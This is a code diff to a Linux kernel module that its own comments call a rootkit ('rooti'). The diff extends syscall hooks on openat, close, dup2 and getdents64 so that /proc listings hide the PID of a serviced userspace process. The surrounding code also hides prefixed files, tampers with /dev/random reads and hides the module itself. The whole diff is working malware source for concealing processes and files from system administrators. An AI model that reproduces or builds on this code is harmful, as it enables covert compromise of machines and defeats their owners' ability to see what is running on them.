@@ -42,10 +42,14 @@ struct rooti_tamper_fd {
     struct list_head head;  // linked list head
 };
 
+// Userspace process serviced by this rootkit
 static struct rooti_client_proc rooti_client = { .pid = 0 };
 
-// List of FDs to /dev/random or /dev/urandom by userspace processes
+// List of FDs to /dev/random or /dev/urandom opened by userspace processes
 static LIST_HEAD(rooti_random_tamper_fds);
+
+// List of /proc directory FDs opened by userspace processes
+static LIST_HEAD(rooti_proc_tamper_fds);
 
 /* Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
  * When hidden, the variable rooti_prev_module stores the address of the node that was previous
@@ -179,6 +183,27 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
         kfree(filepath_kernel);
         return fd;
     }
+    // Check if the requested file to open is the /proc directory
+    else if (strncmp(filepath_kernel, "/proc", NAME_MAX) == 0) {
+        pid_t pid = current->pid;
+        int fd = rooti_orig_openat(regs);
+
+        // Allocate a new record of an open fd
+        tamper_fd = kmalloc(sizeof(*tamper_fd), GFP_KERNEL);
+        if (tamper_fd == NULL) {
+            printk(KERN_DEBUG "rooti: failed to allocate memory\n");
+            return fd;
+        }
+        tamper_fd->pid = pid;
+        tamper_fd->fd = fd;
+
+        // Append the new record
+        INIT_LIST_HEAD(&tamper_fd->head);
+        list_add_tail(&tamper_fd->head, &rooti_proc_tamper_fds);
+
+        kfree(filepath_kernel);
+        return fd;
+    }
 
     kfree(filepath_kernel);
     return rooti_orig_openat(regs);
@@ -197,6 +222,12 @@ static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
             kfree(record);
         }
     }
+    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
+        if (pid == record->pid && fd == record->fd) {
+            list_del(&record->head);
+            kfree(record);
+        }
+    }
     return rooti_orig_close(regs);
 }
 
@@ -209,6 +240,11 @@ static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
     // If present, update the FD of the tampered file. TODO: add instead of delete
     struct rooti_tamper_fd *record;
     list_for_each_entry(record, &rooti_random_tamper_fds, head) {
+        if (pid == record->pid && oldfd == record->fd) {
+            record->fd = newfd;
+        }
+    }
+    list_for_each_entry(record, &rooti_proc_tamper_fds, head) {
         if (pid == record->pid && oldfd == record->fd) {
             record->fd = newfd;
         }
@@ -250,6 +286,7 @@ static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
 static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
 {
     // Invoke the original syscall
+    int fd  = regs->di;
     struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
     int nread = rooti_orig_getdents64(regs);
     if (nread < 0) {
@@ -271,6 +308,16 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
         return nread;
     }
 
+    // Check if the directory FD is of /proc
+    bool is_proc_dir = false;
+    struct rooti_tamper_fd *record;
+    list_for_each_entry(record, &rooti_proc_tamper_fds, head) {
+        if (current->pid == record->pid && fd == record->fd) {
+            is_proc_dir = true;
+            break;
+        }
+    }
+
     // Tamper with the returned records, concealing any files we wish to hide 
     struct linux_dirent64 *curr_record = NULL;
     struct linux_dirent64 *prev_record = NULL;
@@ -279,7 +326,7 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
     while (offset < nread) {
         curr_record = (void *)kernel_buf + offset;
         // Check if the current file begins with the defined prefix, or if the filename is the PID of the process to hide
-        if (strncmp(curr_record->d_name, rooti_client.name, NAME_MAX) == 0 ||
+        if ((is_proc_dir && strncmp(curr_record->d_name, rooti_client.name, NAME_MAX) == 0) ||
             (strlen(curr_record->d_name) >= prefix_length && memcmp(curr_record->d_name, ROOTI_HIDE_PREFIX, prefix_length) == 0)) {
             // Special case where to to hide is is the first element
             if (curr_record == kernel_buf) {
@@ -352,6 +399,10 @@ static void __exit rooti_exit(void)
 
     struct rooti_tamper_fd *record, *tmp;
     list_for_each_entry_safe(record, tmp, &rooti_random_tamper_fds, head) {
+        list_del(&record->head);
+        kfree(record);
+    }
+    list_for_each_entry_safe(record, tmp, &rooti_proc_tamper_fds, head) {
         list_del(&record->head);
         kfree(record);
     }
